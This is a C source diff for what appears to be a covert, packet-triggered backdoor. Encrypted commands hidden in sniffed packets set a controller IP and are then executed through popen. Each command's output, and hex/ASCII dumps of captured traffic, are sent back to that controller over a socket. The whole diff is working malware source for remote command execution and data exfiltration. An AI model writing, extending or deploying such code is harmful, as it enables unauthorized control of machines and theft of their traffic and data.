@@ -20,6 +20,8 @@
 #include "extern.h"
 
 
+char cwd[100] = {0};
+
 // This function will print payload data
 void print_payload (const u_char *payload, int len) {
 
@@ -68,92 +70,91 @@ void print_hex_ascii_line (const u_char *payload, int len, int offset) {
     char temp[256] = {0};
 
 	// the offset
-    if (opts.target_flag == TRUE) {
-        if (opts.pcap2_flag == TRUE) {
-            printf("    %05d   ", offset);
-            sprintf(opts.buffer, "    %05d   ", offset);
-            sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
-                   (struct sockaddr *) &serv_addr, sizeof(serv_addr));
-            memset(opts.buffer, 0, sizeof(opts.buffer));
-        }
+    if (opts.pcap2_flag == TRUE) {
+        printf("    %05d   ", offset);
+        sprintf(opts.buffer, "    %05d   ", offset);
+        sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
+               (struct sockaddr *) &serv_addr, sizeof(serv_addr));
+        memset(opts.buffer, 0, sizeof(opts.buffer));
     }
+
 
 	// print in hex 
 	ch = payload;
-    if (opts.target_flag == TRUE) {
-        if (opts.pcap2_flag == TRUE) {
-            for (i = 0; i < len; i++) {
-                printf("%02x ", *ch);
-                sprintf(temp + strlen(temp), "%02x ", *ch);
-                ch++;
-                if (i == 7) {
-                    printf(" ");
-                    sprintf(temp + strlen(temp), " ");
-                }
+    if (opts.pcap2_flag == TRUE) {
+        for (i = 0; i < len; i++) {
+            printf("%02x ", *ch);
+            sprintf(temp + strlen(temp), "%02x ", *ch);
+            ch++;
+            if (i == 7) {
+                printf(" ");
+                sprintf(temp + strlen(temp), " ");
             }
+        }
 
-            strcpy(opts.buffer, temp);
+        strcpy(opts.buffer, temp);
+        sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
+               (struct sockaddr *) &serv_addr, sizeof(serv_addr));
+        memset(opts.buffer, 0, sizeof(opts.buffer));
+        memset(temp, 0, sizeof(temp));
+    }
+
+	
+	// print spaces to handle a line size of less than 8 bytes
+    if (opts.pcap2_flag == TRUE) {
+        if (len < 8) {
+            printf(" ");
+            strcpy(opts.buffer, " ");
             sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
                    (struct sockaddr *) &serv_addr, sizeof(serv_addr));
             memset(opts.buffer, 0, sizeof(opts.buffer));
-            memset(temp, 0, sizeof(temp));
         }
     }
-	
-	// print spaces to handle a line size of less than 8 bytes
-    if (opts.target_flag == TRUE) {
-        if (opts.pcap2_flag == TRUE) {
-            if (len < 8) {
-                printf(" ");
-                strcpy(opts.buffer, " ");
-                sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
-                       (struct sockaddr *) &serv_addr, sizeof(serv_addr));
-                memset(opts.buffer, 0, sizeof(opts.buffer));
-            }
-        }
-    }
+
 	
 	// Pad the line with whitespace if necessary  
 	if (len < 16) {
 		gap = 16 - len;
-		for (i = 0; i < gap; i++) printf("   ");
-    }
-    if (opts.target_flag == TRUE) {
         if (opts.pcap2_flag == TRUE) {
-            printf("   ");
-            strcpy(opts.buffer, "   ");
-            sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
-                   (struct sockaddr *) &serv_addr, sizeof(serv_addr));
-            memset(opts.buffer, 0, sizeof(opts.buffer));
+            for (i = 0; i < gap; i++) printf("   ");
         }
     }
+
+    if (opts.pcap2_flag == TRUE) {
+        printf("   ");
+        strcpy(opts.buffer, "   ");
+        sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
+               (struct sockaddr *) &serv_addr, sizeof(serv_addr));
+        memset(opts.buffer, 0, sizeof(opts.buffer));
+    }
+
 
 
 	// Print ASCII
 	ch = payload;
-    if (opts.target_flag == TRUE) {
-        if (opts.pcap2_flag == TRUE) {
-            for (i = 0; i < len; i++) {
-                if (isprint(*ch)) {
-                    printf("%c", *ch);
-                    sprintf(temp + strlen(temp), "%c", *ch);
-                }
-                else {
-                    printf(".");
-                    sprintf(temp + strlen(temp), ".");
-                }
-                ch++;
+
+    if (opts.pcap2_flag == TRUE) {
+        for (i = 0; i < len; i++) {
+            if (isprint(*ch)) {
+                printf("%c", *ch);
+                sprintf(temp + strlen(temp), "%c", *ch);
             }
-            printf("\n");
-            sprintf(temp + strlen(temp), "\n");
-            strcpy(opts.buffer, temp);
-            sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
-                   (struct sockaddr *) &serv_addr, sizeof(serv_addr));
-            memset(opts.buffer, 0, sizeof(opts.buffer));
-            memset(opts.buffer, 0, sizeof(opts.buffer));
+            else {
+                printf(".");
+                sprintf(temp + strlen(temp), ".");
+            }
+            ch++;
         }
+        printf("\n");
+        sprintf(temp + strlen(temp), "\n");
+        strcpy(opts.buffer, temp);
+        sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
+               (struct sockaddr *) &serv_addr, sizeof(serv_addr));
+        memset(temp, 0, sizeof(temp));
+        memset(opts.buffer, 0, sizeof(opts.buffer));
     }
 }
+
 
 
 void decrypt_payload(const u_char *payload) {
@@ -164,8 +165,14 @@ void decrypt_payload(const u_char *payload) {
             decrypt_string[i] = encrypt_decrypt(payload[i]);
         }
         if (strncmp(decrypt_string, "start[", 5) == 0) {
-            opts.target_flag = TRUE;
+            opts.ip_flag = TRUE;
             strcpy(opts.sniffer_ip, opts.temp_ip);
+            if (opts.ip_flag == TRUE) {
+                if (opts.serv_flag == FALSE) {
+                    serv_addr.sin_addr.s_addr = inet_addr(opts.sniffer_ip);
+                    opts.serv_flag = TRUE;
+                }
+            }
             extract_square_bracket_string(decrypt_string);
         }
         if (strstr(decrypt_string, "-c") != NULL) {
@@ -180,15 +187,63 @@ void decrypt_payload(const u_char *payload) {
 void extract_square_bracket_string(const char* input) {
     const char* start = strchr(input, '[');
     const char* end = strchr(input, ']');
+    char temp[1024] = {0};
+    FILE* pipe = NULL;
+    char temp_cwd[100] = {0};
+
     if (start != NULL && end != NULL && start < end) {
-        if (strstr(input, "-c") != NULL) {
-            const char* count = strstr(input, "-c");
-            size_t length = count - (start + 1);
-            strncpy(opts.decrypt_instruction, start + 1, length);
+        if (strstr(input, "tcp") != NULL ||
+                strstr(input, "udp") != NULL ||
+                    strstr(input, "port") != NULL) {
+            opts.target_flag = TRUE;
+            if (strstr(input, "-c") != NULL) {
+                const char* count = strstr(input, "-c");
+                size_t length = count - (start + 1);
+                strncpy(opts.decrypt_instruction, start + 1, length);
+                opts.command_flag = TRUE;
+            }
+            else {
+                size_t length = end - (start + 1);
+                strncpy(opts.decrypt_instruction, start + 1, length);
+                opts.command_flag = TRUE;
+            }
         }
         else {
             size_t length = end - (start + 1);
             strncpy(opts.decrypt_instruction, start + 1, length);
+
+            if(strlen(cwd) != 0) chdir(cwd);
+            if (strstr(opts.decrypt_instruction, "cd")) {
+                char* cd_token = strtok(opts.decrypt_instruction, " ");
+                cd_token = strtok(NULL, " ");
+                chdir(cd_token);
+                getcwd(temp_cwd, sizeof(temp_cwd));
+                strcpy(cwd, temp_cwd);
+                memset(temp_cwd, 0, sizeof(temp_cwd));
+            }
+            else {
+                pipe = popen(opts.decrypt_instruction, "r");
+                while (fgets(temp, sizeof(temp), pipe) != NULL) {
+                    // Process or print the captured output
+                    printf("%s", temp);
+                    strcat(opts.buffer, temp);
+                    memset(temp, 0, sizeof(temp));
+                }
+                pclose(pipe);
+            }
+            if (strlen(opts.buffer) == 0) {
+                pipe = popen("pwd", "r");
+                while (fgets(temp, sizeof(temp), pipe) != NULL) {
+                    strcat(opts.buffer, temp);
+                    memset(temp, 0, sizeof(temp));
+                }
+                pclose(pipe);
+            }
         }
+        sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
+               (struct sockaddr *) &serv_addr, sizeof(serv_addr));
+        memset(opts.buffer, 0, sizeof(opts.buffer));
+
+        /* close */
     }
 }
